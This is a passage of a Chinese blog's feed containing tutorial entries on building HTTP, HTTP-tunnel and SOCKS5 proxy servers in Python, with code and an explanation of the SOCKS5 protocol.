class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(self, sock, data)</span>:</span></span><br><span class="line">        print(data)</span><br><span class="line">        bytes_sent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            r = sock.send(data[bytes_sent:])</span><br><span class="line">            <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">            bytes_sent += r</span><br><span class="line">            <span class="keyword">if</span> bytes_sent == len(data):</span><br><span class="line">                <span class="keyword">return</span> bytes_sent</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(self, sock, remote)</span>:</span></span><br><span class="line">        <span class="comment"># 处理 client socket 和 remote socket 的数据流</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fdset = [sock, remote]</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                <span class="comment"># 用 IO 多路复用 select 监听套接字是否有数据流</span></span><br><span class="line">                r, w, e = select.select(fdset, [], [])</span><br><span class="line">                <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">                    data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    result = self.send_data(remote, data)</span><br><span class="line">                    <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                    data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    result = self.send_data(sock, data)</span><br><span class="line">                    <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span>(e)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            sock.close()</span><br><span class="line">            remote.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_CONNECT</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析出 host 和 port</span></span><br><span class="line">        uri = self.path.split(<span class="string">":"</span>)</span><br><span class="line">        host, port = uri[<span class="number">0</span>], int(uri[<span class="number">1</span>])</span><br><span class="line">        host_ip = socket.gethostbyname(host)</span><br><span class="line"></span><br><span class="line">        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        remote_sock.connect((host_ip, port))</span><br><span class="line">        <span class="comment"># 告诉客户端 CONNECT 成功</span></span><br><span class="line">        self.wfile.write(<span class="string">"&#123;protocol_version&#125; 200 Connection Established\r\n\r\n"</span>.format(protocol_version=self.protocol_version).encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转发请求</span></span><br><span class="line">        self.handle_tcp(self.connection, remote_sock)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        server.socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>有一个 <code>do_CONNECT</code> 函数的处理，实现之前隧道的建立，然后 <code>handle_tcp</code> ，代码和之前 socks5 代理是一样的。</p><p>参考链接：</p><ul><li><a href="https://imququ.com/post/web-proxy.html" target="_blank" rel="noopener">https://imququ.com/post/web-proxy.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要实现隧道代理，让 https 请求也能代理。&lt;/p&gt;
&lt;p&gt;隧道代理的原理是：&lt;br&gt;&lt;code&gt;HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(6)-http-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-6-http-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-6-http-代理-md/</id>
    <published>2017-08-20T07:26:36.000Z</published>
    <updated>2018-01-27T14:47:50.052Z</updated>
    
    <content type="html"><![CDATA[<p>本文讲 http 代理，顾名思义，http 代理代理的是 http 请求，其实这里面分两类</p><pre><code>* 普通代理 这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文。* 隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接。</code></pre><a id="more"></a><p>通俗一点讲，普通代理解析 http 包，然后将请求转发到目标地址，但是没法解析 https 的包，所以也就没法代理 https 的请求，但是隧道代理可以代理 https 的请求或者其他的一些协议请求。</p><h3 id="0x01-普通代理"><a href="#0x01-普通代理" class="headerlink" title="0x01 普通代理"></a>0x01 普通代理</h3><p>代码很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv_data_from_remote</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            recv_data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> recv_data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += recv_data</span><br><span class="line">        sock.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 解析 GET 请求信息</span></span><br><span class="line">        uri = urlparse(self.path)</span><br><span class="line">        scheme, host, path = uri.scheme, uri.hostname, uri.path</span><br><span class="line">        host_ip = socket.gethostbyname(host)</span><br><span class="line">        port = <span class="number">443</span> <span class="keyword">if</span> scheme == <span class="string">"https"</span> <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为了简单起见，Connection 都为 close, 也就不需要 Proxy-Connection 判断了</span></span><br><span class="line">        <span class="keyword">del</span> self.headers[<span class="string">'Proxy-Connection'</span>]</span><br><span class="line">        self.headers[<span class="string">'Connection'</span>] = <span class="string">'close'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造新的 http 请求</span></span><br><span class="line">        send_data = <span class="string">"GET &#123;path&#125; &#123;protocol_version&#125;\r\n"</span>.format(path=path, protocol_version=self.protocol_version)</span><br><span class="line">        headers = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.headers.items():</span><br><span class="line">            headers += <span class="string">"&#123;key&#125;: &#123;value&#125;\r\n"</span>.format(key=key, value=value)</span><br><span class="line">        headers += <span class="string">'\r\n'</span></span><br><span class="line">        send_data += headers</span><br><span class="line"></span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.connect((host_ip, port))</span><br><span class="line">        <span class="comment"># 发送请求到目标地址</span></span><br><span class="line">        sock.sendall(send_data.encode())</span><br><span class="line">        data = self._recv_data_from_remote(sock)</span><br><span class="line"></span><br><span class="line">        self.wfile.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        server.socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里面就实现了 get 请求的转发，只用单线程的方式来处理，其他的有兴趣的同学可以自己扩展下。<br>看下效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 http_server.py</span><br></pre></td></tr></table></figure><p><img src="/media/15032177986462.jpg" alt=""></p><p>配置完代理后可以发现 http 的请求都能正常转发，但是 https 的都没法识别。</p><p>下篇教程看如何通过隧道代理解决这个问题。</p><p>参考资料</p><pre><code>* https://imququ.com/post/web-proxy.html* http://www.lyyyuna.com/2016/01/16/http-proxy-get1/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文讲 http 代理，顾名思义，http 代理代理的是 http 请求，其实这里面分两类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 普通代理 这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文。
* 隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(5)-socks5-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-5-socks5-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-5-socks5-代理-md/</id>
    <published>2017-08-20T06:39:30.000Z</published>
    <updated>2018-01-27T14:48:27.065Z</updated>
    
    <content type="html"><![CDATA[<p>既然 socks5 是协议，所以客户端也必须有 socks5 的实现才能和服务端连接。这里面我就用现成的开源库 <a href="https://github.com/Anorov/PySocks" target="_blank" rel="noopener">PySocks</a> 来演示下。</p><p>pySocks 有两种方式来实现，一种是直接的 <code>s = socks.socksocket()</code> 创建一个新的 socket 对象，还有一种是 Monkeypatching，算是 python 的黑魔法。</p><a id="more"></a><p>我们用第一种方法试下<br>首先把代理服务器开起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 socks5_server.py</span><br></pre></td></tr></table></figure><p>然后运行如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socks</span><br><span class="line">s = socks.socksocket() <span class="comment"># Same API as socket.socket in the standard lib</span></span><br><span class="line">s.set_proxy(socks.SOCKS5, <span class="string">"localhost"</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">"www.weibo.com"</span>, <span class="number">80</span>))</span><br><span class="line">s.sendall(<span class="string">"GET / HTTP/1.1 /r/n/r/n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure><p>返回值如下<br><img src="/media/15032136331944.jpg" alt=""></p><p>由于没有设置 http 正确的 header，所以 weibo 服务器返回了 400</p><p>当然你可以直接用 chrome 的 代理插件设置如下</p><p><img src="/media/15032137273241.jpg" alt=""></p><p>可以看到所有的请求都经过 socks5 服务器了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然 socks5 是协议，所以客户端也必须有 socks5 的实现才能和服务端连接。这里面我就用现成的开源库 &lt;a href=&quot;https://github.com/Anorov/PySocks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PySocks&lt;/a&gt; 来演示下。&lt;/p&gt;
&lt;p&gt;pySocks 有两种方式来实现，一种是直接的 &lt;code&gt;s = socks.socksocket()&lt;/code&gt; 创建一个新的 socket 对象，还有一种是 Monkeypatching，算是 python 的黑魔法。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(4)-socks5-代理.md</title>
    <link href="https://facert.github.io/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-4-socks5-%E4%BB%A3%E7%90%86-md/"/>
    <id>https://facert.github.io/2017/08/20/由浅入深写代理-4-socks5-代理-md/</id>
    <published>2017-08-20T06:06:55.000Z</published>
    <updated>2018-01-27T14:59:34.511Z</updated>
    
    <content type="html"><![CDATA[<p>接下来我们用 python 写下 socks5 服务端的实现</p><a id="more"></a><h3 id="0x03-socks5-实现"><a href="#0x03-socks5-实现" class="headerlink" title="0x03 socks5 实现"></a>0x03 socks5 实现</h3><p>先看下整体代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(sock, data)</span>:</span></span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        <span class="keyword">if</span> bytes_sent == len(data):</span><br><span class="line">            <span class="keyword">return</span> bytes_sent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(sock, remote)</span>:</span></span><br><span class="line">    <span class="comment"># 处理 client socket 和 remote socket 的数据流</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 用 IO 多路复用 select 监听套接字是否有数据流</span></span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">                data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_con</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    <span class="comment"># 接受客户端来的请求，socks5 的 认证和连接过程</span></span><br><span class="line"></span><br><span class="line">    sock.recv(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># 无需进一步认证信息</span></span><br><span class="line">    sock.send(<span class="string">b"\x05\x00"</span>)</span><br><span class="line">    data = sock.recv(<span class="number">4</span>) <span class="keyword">or</span> <span class="string">'\x00'</span> * <span class="number">4</span></span><br><span class="line">    <span class="comment"># CMD 为 0x01 也就是 CONNECT 继续</span></span><br><span class="line">    mode = data[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> mode != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># DST.ADDR 有三种形式，分别做判断</span></span><br><span class="line">    addr_type = data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> addr_type == <span class="number">1</span>:</span><br><span class="line">        addr_ip = sock.recv(<span class="number">4</span>)</span><br><span class="line">        remote_addr = socket.inet_ntoa(addr_ip)</span><br><span class="line">    <span class="keyword">elif</span> addr_type == <span class="number">3</span>:</span><br><span class="line">        addr_len = int.from_bytes(sock.recv(<span class="number">1</span>), byteorder=<span class="string">'big'</span>)</span><br><span class="line">        remote_addr = sock.recv(addr_len)</span><br><span class="line">    <span class="keyword">elif</span> addr_type == <span class="number">4</span>:</span><br><span class="line">        addr_ip = sock.recv(<span class="number">16</span>)</span><br><span class="line">        remote_addr = socket.inet_ntop(socket.AF_INET6, addr_ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># DST.PORT</span></span><br><span class="line">    remote_addr_port = struct.unpack(<span class="string">'&gt;H'</span>, sock.recv(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回给客户端 success</span></span><br><span class="line">    reply = <span class="string">b"\x05\x00\x00\x01"</span></span><br><span class="line">    reply += socket.inet_aton(<span class="string">'0.0.0.0'</span>) + struct.pack(<span class="string">"&gt;H"</span>, <span class="number">8888</span>)</span><br><span class="line">    sock.send(reply)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拿到 remote address 的信息后，建立连接</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote = socket.create_connection((remote_addr, remote_addr_port[<span class="number">0</span>]))</span><br><span class="line">        logging.info(<span class="string">'connecting %s:%d'</span> % (remote_addr, remote_addr_port[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    handle_tcp(sock, remote)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socketServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    socketServer.bind((<span class="string">''</span>, <span class="number">8888</span>))</span><br><span class="line">    socketServer.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            sock, addr = socketServer.accept()</span><br><span class="line">            t = threading.Thread(target=handle_con, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(e)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        socketServer.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>首先，上面只是个 socks5 服务器的简单实现，处理 TCP 的转发，无需密码认证。</p><p>接下来我们分开来看，主要是三个部分 <code>main()</code>, <code>handle_con()</code>, <code>handle_tcp()</code> </p><ul><li><code>main()</code> 函数大家其实挺熟悉的，就是前面教程介绍的 socket 编程的线程方法，绑定套接字监听，然后有客户端请求后，调用 <code>handle_con()</code></li><li><code>handle_con</code> 实现了 socks5 的 认证和连接过程，大家对照下注释和前面的 socks5 协议，应该挺容易看懂。</li><li>认证完成后，就开始转发请求了， <code>handle_tcp()</code> 实现了这个功能，这里面用到了 <code>select</code> ，IO 多路复用模式。其实一开始怕大家不理解，也想用线程来实现，不过发现 IO 多路复用在一个线程中就能监听多个套接字，代码比多线程方式更加简洁，索性就这么用了。这里面没有根据平台去判断用 select, poll 还是 epoll，感兴趣的话可以直接看 shadowsocks 的实现 <a href="https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/eventloop.py" target="_blank" rel="noopener">eventloop</a></li></ul><p>下篇我们看看 socks5 服务器如何和 client 端交互。</p><p>参考链接：</p><pre><code>* https://github.com/felix021/ssocks5/blob/master/ssocks5.py* https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接下来我们用 python 写下 socks5 服务端的实现&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(3) -socks5 代理</title>
    <link href="https://facert.github.io/2017/08/19/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-3-socks5-%E4%BB%A3%E7%90%86/"/>
    <id>https://facert.github.io/2017/08/19/由浅入深写代理-3-socks5-代理/</id>
    <published>2017-08-19T07:34:32.000Z</published>
    <updated>2018-01-27T14:59:43.601Z</updated>
    
    <content type="html"><![CDATA[<p>本文讲的是如何写一个 socks5 代理，其实 shadowsocks 的代理也是 socks5 协议的，所以 socks5 代理也是本系列教程的一个重点。</p><p>首先放出 socks5 协议的 <a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="noopener">rfc</a>，socks5 协议很简单，SOCKS5 协议并不负责代理服务器的数据传输环节，此协议只是在 C/S 两端真实交互之间，建立起一条从客户端到代理服务器的授信连接。<br><a id="more"></a></p><h3 id="sock5-代理结构图"><a href="#sock5-代理结构图" class="headerlink" title="sock5 代理结构图"></a>sock5 代理结构图</h3><p><img src="/media/15032089114950.jpg" alt=""></p><h3 id="0x02-socks5-协议分析"><a href="#0x02-socks5-协议分析" class="headerlink" title="0x02 socks5 协议分析"></a>0x02 socks5 协议分析</h3><h5 id="认证阶段"><a href="#认证阶段" class="headerlink" title="认证阶段"></a>认证阶段</h5><p>首先客户端需要和服务端有个握手认证的过程，可以采用 <strong>用户名/密码</strong> 认证或者无需认证方式。</p><p>格式如下 （<em>数字表示位数</em>）</p><pre><code>+----+----------+----------+|VER | NMETHODS | METHODS  |+----+----------+----------+| 1  |    1     |  1~255   |+----+----------+----------+</code></pre><ul><li>VER 字段是当前协议的版本号，也就是 5；</li><li>NMETHODS 字段是 METHODS 字段占用的字节数；</li><li><p>METHODS 字段的每一个字节表示一种认证方式，表示客户端支持的全部认证方式。</p><pre><code>0x00: NO AUTHENTICATION REQUIRED0x01: GSSAPI0x02: USERNAME/PASSWORD0x03: to X’7F’ IANA ASSIGNED0x80: to X’FE’ RESERVED FOR PRIVATE METHODS0xFF: NO ACCEPTABLE METHODS</code></pre></li></ul><p>服务端返回格式</p><pre><code>+----+--------+|VER | METHOD |+----+--------+| 1  |   1    |+----+--------+</code></pre><p>一般情况下服务端返回两种情况</p><pre><code>0x05 0x00：告诉客户端采用无认证的方式建立连接；0x05 0xff：客户端的任意一种认证方式服务器都不支持。</code></pre><p>举个例子， 服务器无需认证的情况如下</p><pre><code>client -&gt; server: 0x05 0x01 0x00server -&gt; client: 0x05 0x00</code></pre><h5 id="连接阶段"><a href="#连接阶段" class="headerlink" title="连接阶段"></a>连接阶段</h5><p>认证完成，客户端向服务端发送请求：</p><pre><code>+----+-----+-------+------+----------+----------+|VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |+----+-----+-------+------+----------+----------+| 1  |  1  |   1   |  1   | Variable |    2     |+----+-----+-------+------+----------+----------+</code></pre><ul><li>CMD 字段 command 的缩写：<ul><li>0x01：CONNECT 建立 TCP 连接</li><li>0x02: BIND 上报反向连接地址</li><li>0x03：关联 UDP 请求</li></ul></li><li>RSV 字段：保留字段，值为 0x00</li><li>ATYP 字段：address type 的缩写，取值为：<ul><li>0x01：IPv4        </li><li>0x03：域名</li><li>0x04：IPv6</li></ul></li><li>DST.ADDR 字段：destination address 的缩写，取值随 ATYP 变化：<ul><li>ATYP == 0x01：4 个字节的 IPv4 地址</li><li>ATYP == 0x03：1 个字节表示域名长度，紧随其后的是对应的域名</li><li>ATYP == 0x04：16 个字节的 IPv6 地址</li><li>DST.PORT 字段：目的服务器的端口</li></ul></li></ul><p>服务端返回格式</p><pre><code>+----+-----+-------+------+----------+----------+|VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |+----+-----+-------+------+----------+----------+| 